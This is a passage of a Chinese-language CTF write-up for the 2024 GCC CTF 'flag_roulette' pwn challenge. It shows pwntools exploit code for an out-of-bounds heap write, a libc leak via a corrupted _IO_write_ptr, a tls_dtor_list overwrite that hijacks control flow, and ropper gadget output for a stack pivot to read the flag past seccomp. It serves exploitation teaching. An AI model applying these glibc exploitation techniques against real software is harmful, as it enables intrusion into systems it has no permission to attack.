<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./flag_roulette</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x1709
b * __call_tls_dtors
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">rol</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">):</span>
    <span class="n">part1</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&lt;&lt;</span> <span class="n">i</span>
    <span class="n">part1</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="n">part2</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">64</span><span class="o">-</span> <span class="n">i</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">part1</span> <span class="o">+</span> <span class="n">part2</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">How many bytes would you like to bet on ?</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="c1"># 0x7f ~ 0x21000
</span>    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please choose the index of the byte to modify</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Please set the new value of this byte</span><span class="se">\n</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">rm</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># OOB
</span><span class="k">def</span> <span class="nf">write_b</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="nf">rm</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">write_Q</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">c</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">heap_ptr</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">heap_ptr</span>
    <span class="n">data</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="nf">write_b</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>

<span class="c1"># 修改 mp_.no_dyn_threshold
</span><span class="nf">write_b</span><span class="p">(</span><span class="mh">0x1f8398</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>


<span class="sh">'''</span><span class="s">
libc leak
</span><span class="sh">'''</span>
<span class="c1"># 修改 _IO_write_ptr
</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="mh">0x1f9798</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1923632</span>
<span class="n">tls_base</span>  <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mi">10432</span>
<span class="n">heap_ptr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x24ff0</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">tls_base</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>没修改前</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174058-zwpbyhs.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174058-zwpbyhs.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>修改后 <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code>​ 大于 <code class="language-plaintext highlighter-rouge">_IO_write_base</code>​ 所以可以泄露 它们之间的数据包含一个 libc 上的地址</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174139-s58vp5i.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174139-s58vp5i.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174317-kiv8wtg.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174317-kiv8wtg.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="exploit-attack-tls_dtor_list"><span class="me-2">exploit-Attack tls_dtor_list</span><a href="#exploit-attack-tls_dtor_list" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="p">...</span><span class="bp">...</span>

<span class="c1"># OOB
</span><span class="nf">write_b</span><span class="p">(</span><span class="mh">0x1f8398</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>


<span class="sh">'''</span><span class="s">
libc leak
</span><span class="sh">'''</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="mh">0x1f9798</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1923632</span>
<span class="n">tls_base</span>  <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mi">10432</span>
<span class="n">heap_ptr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x24ff0</span>

<span class="nf">rm</span><span class="p">()</span>

<span class="c1"># tls_base + 0x30
</span><span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x00</span><span class="p">)</span>

<span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">-</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">tls_base</span><span class="o">-</span><span class="mh">0x48</span><span class="p">)</span>
<span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">-</span><span class="mh">0x48</span><span class="p">,</span> <span class="nf">rol</span><span class="p">(</span><span class="mh">0x41424344</span><span class="p">,</span><span class="mh">0x11</span><span class="p">))</span>
<span class="nf">write_Q</span><span class="p">(</span><span class="n">tls_base</span><span class="o">-</span><span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x44454647</span><span class="p">)</span>

<span class="nf">add</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">tls_base</span><span class="sh">'</span><span class="p">)</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">itr</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>观察 修改后 的tls附近的数据</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174624-48cl4sq.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174624-48cl4sq.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>现在已经可以控制执行流了，但是由于存在 <code class="language-plaintext highlighter-rouge">seccomp</code>​ 沙箱，不能使用 <code class="language-plaintext highlighter-rouge">system</code>​ <code class="language-plaintext highlighter-rouge">execve</code>​</li>
  <li>只能通过 ORW 去读取flag 文件，还需要一个 gadget ~</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174647-n4x0w9g.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310174647-n4x0w9g.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="exploit-need_a_gadget"><span class="me-2">exploit-need_a_gadget</span><a href="#exploit-need_a_gadget" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>由于只能 通过ORW 的方式去读取flag, 只能 <code class="language-plaintext highlighter-rouge">call</code>​ 一个地址显然不能满足我们现在的需求</li>
  <li>这里我们就需要使用栈迁移来帮助我们 进行 ROP ，还需要一个 gadget</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310190827-pkr2hnq.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310190827-pkr2hnq.png" alt="image" loading="lazy"></a>​</p>

<p>可以控制某些寄存器中的附近值</p>

<pre><code class="language-regs">rax
rbx 
rdx
rsi
r14
r15
</code></pre>

<ul>
  <li>使用 ropper 工具，我们希望 可以控制 rbp 然后进行 <code class="language-plaintext highlighter-rouge">leave</code>​ . (如果你使用 ROPgadget可能就找不到这些gadget)</li>
</ul>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310191403-km5j7af.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-03-07-GCC-CTF/assets/image-20240310191403-km5j7af.png" alt="image" loading="lazy"></a>​</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="err">➜</span>  <span class="mi">2024</span><span class="n">_gccctf_Flag_Roulette</span> <span class="n">ropper</span>
<span class="p">(</span><span class="n">ropper</span><span class="p">)</span><span class="o">&gt;</span> <span class="nb">file</span> <span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Load</span> <span class="n">gadgets</span> <span class="k">from</span> <span class="n">cache</span>
<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">loading</span><span class="p">...</span> <span class="mi">100</span><span class="o">%</span>
<span class="p">[</span><span class="n">LOAD</span><span class="p">]</span> <span class="n">removing</span> <span class="n">double</span> <span class="n">gadgets</span><span class="p">...</span> <span class="mi">100</span><span class="o">%</span>
<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">File</span> <span class="n">loaded</span><span class="p">.</span>
<span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="o">/</span><span class="n">ELF</span><span class="o">/</span><span class="n">x86_64</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">search</span> <span class="n">mov</span> <span class="n">rbp</span>
<span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">gadgets</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span>
                                                                                                                                                                                                                 <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">File</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>
<span class="mh">0x00000000000fd4a1</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="mh">0xffffffffffffffff</span><span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>
<span class="mh">0x00000000001644d2</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">cr6</span><span class="p">;</span> <span class="n">out</span> <span class="n">dx</span><span class="p">,</span> <span class="n">eax</span><span class="p">;</span> <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="n">rcx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">];</span> <span class="n">ret</span><span class="p">;</span>
<span class="mh">0x00000000000fd45b</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">r12</span><span class="p">];</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span><span class="p">;</span> <span class="n">pop</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>
<span class="mh">0x0000000000093804</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">r8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">];</span> <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">r8</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">r8</span><span class="p">];</span> <span class="n">call</span> <span class="mh">0x263a0</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">call</span> <span class="n">rbx</span><span class="p">;</span>
<span class="mh">0x0000000000145e36</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">];</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">];</span> <span class="n">lea</span> <span class="n">r13</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">];</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">],</span> <span class="mi">0</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">r13</span><span class="p">;</span> <span class="n">call</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">];</span>
<span class="mh">0x0000000000099ab4</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsi</span> <span class="o">+</span> <span class="mi">8</span><span class="p">];</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">];</span> <span class="n">test</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rbx</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">],</span> <span class="mi">1</span><span class="p">;</span> <span class="n">jne</span> <span class="mh">0x99a98</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rsi</span><span class="p">;</span> <span class="n">call</span> <span class="n">rax</span><span class="p">;</span>
<span class="mh">0x0000000000143473</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rsp</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">];</span> <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rbx</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">];</span> <span class="n">call</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">];</span>
<span class="mh">0x000000000007eb00</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">r12</span><span class="p">;</span> <span class="n">pop</span> <span class="n">rbx</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>
<span class="mh">0x000000000003c33b</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">r9</span><span class="p">;</span> <span class="n">jmp</span> <span class="n">rdx</span><span class="p">;</span>
<span class="mh">0x000000000007eaef</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rax</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">rbp</span><span class="p">;</span> <span class="n">pop</span> <span class="n">r12</span><span class="p">;</span> <span class="n">ret</span><span class="p">;</span>
<span class="mh">0x0000000000108448</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rcx</span><span class="p">;</span> <span class="n">push</span> <span class="n">rbx</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rbx</span><span class="p">,</span> <span class="n">rdi</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rcx</span><span class="p">;</span> <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="p">;</span> <span class="n">call</span> <span class="n">rsi</span><span class="p">;</span>
<span class="mh">0x0000000000074042</span><span class="p">:</span> <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rdx</span><span class="p">;</span> <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">];</span> <span class="n">call</span> <span class="n">rax</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<blockquote>
  <p>选择使用这个 0x0000000000099ab4，后面的call rax 肯就需要是leave; ret</p>

  <p>0x0000000000099ab4: mov rbp, qword ptr [rsi + 8]; mov rax, qword ptr [rbx + 0x40]; test byte ptr [rbx + 0x50], 1; jne 0x99a98; mov rdi, rsi; call rax;</p>
</blockquote>

<p>‍</p>

<h3 id="exploit"><span class="me-2">exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>最终</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
